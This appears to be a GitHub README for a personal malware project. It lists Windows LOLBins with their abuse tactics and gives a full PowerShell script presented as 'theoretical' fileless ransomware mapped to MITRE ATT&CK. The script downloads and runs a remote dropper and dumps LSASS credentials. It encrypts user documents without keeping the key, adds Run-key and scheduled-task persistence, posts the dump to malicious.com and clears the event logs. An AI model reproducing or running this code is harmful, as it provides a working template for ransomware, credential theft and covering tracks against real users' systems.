
# NSFW - Fileless Malware

![bsod](https://github.com/user-attachments/assets/28d25a60-2ecf-44a3-bdbc-d55bbb3757d0)

## Introduction

This repository started out as a humble proof-of-concept—just me tinkering in the dark, learning the ropes of ransomware, wiperware, fileless malware, and the full MITRE ATT&CK kill chain. One year deep into the project, it has evolved significantly.

## LOLBins 101: Living off the Land Binaries & Scripts

**LOLBins** are legitimate Windows utilities repurposed by attackers to execute payloads, evade detection, and persist. Because they're trusted system tools, they offer stealth and flexibility for malware operations.
## Common LOLBins and Use Cases

| LOLBin | Abuse | Tactics |
|--------|-------|---------|
| `rundll32.exe` | Execute DLLs | Code exec, EDR bypass |
| `mshta.exe` | Run HTA payloads | Script exec, sandbox evasion |
| `regsvr32.exe` | Load COM DLLs | Fileless exec, C2 proxy |
| `wmic.exe` | WMI command exec | Proc launch, lateral move |
| `cmd.exe / powershell.exe` | Script runners | Payloads, persistence |
| `msbuild.exe` | Inline C# compile/exec | Fileless malware |
| `certutil.exe` | Download/decode files | Exfil, LOLBin abuse |
| `bitsadmin.exe` | Fetch remote files | Delivery, persistence |
| `schtasks.exe` | Schedule task | Priv escalation, persistence |
| `esentutl.exe` | Copy/exec files | Exfil, stealth ops |

---

## Theoretical Example of '100% Fileless' Ransomware Using the MITRE ATT&CK Framework

```powershell
# Advanced Ransomware Simulation Workflow - Single Execution PowerShell Script
# Educational & Research Purposes Only (Controlled Lab Environment)
# MITRE ATT&CK Mapped per Stage

# 1️⃣ Initial Access (T1190 - Exploit Public-Facing Application)
$payloadUrl = "http://malicious.com/dropper.ps1"
IEX(New-Object Net.WebClient).DownloadString($payloadUrl)

# 2️⃣ Execution (T1059.001 - Command and Scripting Interpreter: PowerShell)
$encPayload = "[Base64-Encoded Payload]"
$decodedPayload = [System.Convert]::FromBase64String($encPayload)
[System.Reflection.Assembly]::Load($decodedPayload)

# 3️⃣ Privilege Escalation (T1548 - Abuse Elevation Control Mechanism)
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\elevate.ps1" -Verb RunAs

# 4️⃣ Credential Access (T1003.001 - LSASS Dumping)
Invoke-Expression "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full"

# 5️⃣ Discovery (T1082 - System Information Discovery)
$sysInfo = Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model, Name, Domain, UserName
$networkInfo = Get-NetAdapter | Select-Object Name, MacAddress, Status
Write-Output $sysInfo
Write-Output $networkInfo

# 6️⃣ Lateral Movement (T1021.001 - Remote Desktop Protocol)
cmd.exe /c "wmic /node:targetPC process call create 'powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'"

# 7️⃣ Impact - Advanced Encryption (T1486 - Data Encrypted for Impact)
$targetFiles = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.txt,*.docx,*.xls -Recurse
foreach ($file in $targetFiles) {
    $content = Get-Content $file.FullName -Raw
    $key = (1..32 | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) }) -join ''
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, 'X'))
    $aes.IV = New-Object byte[] 16
    $encryptor = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
    $encryptedContent = [Convert]::ToBase64String($encryptor.TransformFinalBlock($bytes, 0, $bytes.Length))
    Set-Content -Path $file.FullName -Value $encryptedContent
}

# 8️⃣ Persistence (T1547.001 - Registry Run Key & Scheduled Task)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousProcess" -Value "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1" -PropertyType String
schtasks /create /tn "MaliciousTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1" /sc onlogon /rl highest

# 9️⃣ Exfiltration (T1041 - Exfiltration Over C2 & Encrypted Channels)
$exfilData = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp"))
Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfilData

# 1️⃣0️⃣ Defense Evasion & Cleanup (T1070 - Indicator Removal, Log Clearing, Process Masquerading)
Remove-Item -Path C:\Windows\Temp\* -Force -Recurse
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
cmd.exe /c "attrib +h +s C:\Windows\Temp\*"
```

## Additional Resources
- [PrintNightmare Guide](https://itm4n.github.io/printnightmare-not-over/)
- [PrintNightmare](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-elevation-of-privilege-vulnerability-eop-the-printnightmare-of-2021/)
- [LOLOL Farm](https://lolol.farm/)
- [ATT&CK MITRE](https://attack.mitre.org/software/S0697/)
- [LOLGEN](https://lolgen.hdks.org/)
- [Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)
- [Dll injection](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- [Print drivers](https://github.com/jacob-baines/concealed_position)



